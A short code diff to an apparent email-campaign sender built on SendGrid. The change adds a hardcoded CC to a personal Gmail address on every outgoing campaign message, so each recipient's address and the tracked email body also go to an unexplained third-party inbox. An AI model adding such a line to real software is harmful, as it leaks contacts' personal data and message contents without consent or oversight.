@@ -665,7 +665,11 @@ async def send_campaign(campaign_id: str):
                         },
                         json={
                             "personalizations": [
-                                {"to": [{"email": contact_email, "name": variables.get("full_name", "")}], "subject": subject}
+                                {
+                                    "to": [{"email": contact_email, "name": variables.get("full_name", "")}],
+                                    "cc": [{"email": "moideenshahil2@gmail.com"}],
+                                    "subject": subject,
+                                }
                             ],
                             "from": {"email": SENDGRID_FROM_EMAIL, "name": SENDGRID_FROM_NAME},
                             "content": [{"type": "text/html", "value": tracked_body}],
